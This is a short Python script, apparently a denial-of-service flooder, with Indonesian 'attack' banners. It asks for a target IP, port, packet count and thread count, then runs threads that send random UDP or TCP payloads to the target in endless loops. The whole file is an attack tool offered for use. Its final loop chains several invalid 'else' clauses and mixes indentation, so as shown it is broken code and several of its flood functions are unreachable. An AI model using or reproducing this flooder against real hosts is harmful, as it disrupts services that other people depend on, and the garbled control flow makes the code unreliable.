#!/usr/bin/env python3
import random
import socket
import threading



print       (" - - > SERANG!!!!!!!!!! <- - ")
print       (" - - > BISMILLAH DULU <- - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input("  (y/n):"))
times = int(input(" Paket :"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1400)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Rinus Attacking ")
		except:
			print("[!] RUSAK")


def run2():
	data = random._urandom(1800)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rinus Attacking ")
		except:
			s.close()
			print("[*] RUSAK")


def run3():
	data = random._urandom(1180)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rinus Attacking ")
		except:
			s.close()
			print("[*] Broke")


def run4():
	data = random._urandom(1800)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rinus Attacking ")
		except:
			s.close()
			print("[*] Broke")


def run5():
	data = random._urandom(1800)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rinus Attacking ")
		except:
			s.close()
			print("[*] Broke")

def run6():
	data = random._urandom(1450)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rinus Attacking ")
		except:
			s.close()
			print("[*] Broke")

def run7():
	data = random._urandom(65000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rinus Attacking ")
		except:
			s.close()
			print("[*] Broke")

def run8():
	data = random._urandom(1920)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rinus Attacking ")
		except:
			s.close()
			print("[*] Broke")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
	else:
                th = threading.Thread(target = run3)
                th.start()
        else:
                th = threading.Thread(target = run4)
                th.start()
        else:
		th = threading.Thread(target = run5)
		th.start()
	else:
                th = threading.Thread(target = run6)
                th.start()
        else:
                th = threading.Thread(target = run7)
                th.start()
        else:
                th = threading.Thread(target = run8)
                th.start()
